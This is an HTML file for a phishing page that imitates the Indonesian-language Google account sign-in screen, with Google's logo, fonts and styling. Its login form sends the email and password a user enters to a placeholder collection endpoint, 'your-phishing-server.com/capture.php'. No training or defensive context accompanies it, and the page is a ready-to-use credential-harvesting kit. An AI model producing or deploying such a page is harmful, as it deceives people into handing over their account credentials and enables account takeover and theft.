<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Masuk – Akun Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Roboto', 'Google Sans', sans-serif;
      background-color: #fff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 100%;
      max-width: 450px;
      padding: 40px 40px 36px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
      box-sizing: border-box;
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo img {
      height: 30px;
    }
    h1 {
      font-size: 24px;
      font-weight: 400;
      text-align: center;
      margin: 0 0 16px;
      color: #202124;
    }
    p.subtitle {
      font-size: 16px;
      color: #5f6368;
      text-align: center;
      margin: 0 0 40px;
    }
    .input-container {
      position: relative;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 13px 16px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      box-sizing: border-box;
      outline: none;
    }
    input:focus {
      border: 2px solid #1a73e8;
      padding: 12px 15px;
    }
    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 30px;
      font-size: 14px;
    }
    .footer a {
      color: #1a73e8;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
    .btn {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #1765cc;
    }
    .language {
      color: #5f6368;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <h1>Masuk</h1>
    <p class="subtitle">Gunakan Akun Google Anda</p>

    <form action="https://your-phishing-server.com/capture.php" method="POST" autocomplete="off">
      <div class="input-container">
        <input type="email" name="email" required placeholder="Email atau telepon" autocomplete="username">
      </div>

      <div class="input-container">
        <input type="password" name="password" required placeholder="Kata sandi" autocomplete="current-password">
      </div>

      <div class="footer">
        <a href="#">Lupa email?</a>
        <button type="submit" class="btn">Berikutnya</button>
      </div>
    </form>

    <div style="margin-top: 40px; text-align: center; font-size: 14px; color: #5f6368;">
      <span class="language">Bahasa Indonesia ▾</span>
    </div>

    <div style="margin-top: 50px; text-align: center; font-size: 12px; color: center; color: #5f6368;">
      <a href="#" style="margin: 0 10px; color: #5f6368; text-decoration: none;">Bantuan</a>
      <a href="#" style="margin: 0 10px; color: #5f6368; text-decoration: none;">Privasi</a>
      <a href="#" style="margin: 0 10px; color: #5f6368; text-decoration: none;">Persyaratan</a>
    </div>
  </div>
</body>
</html>
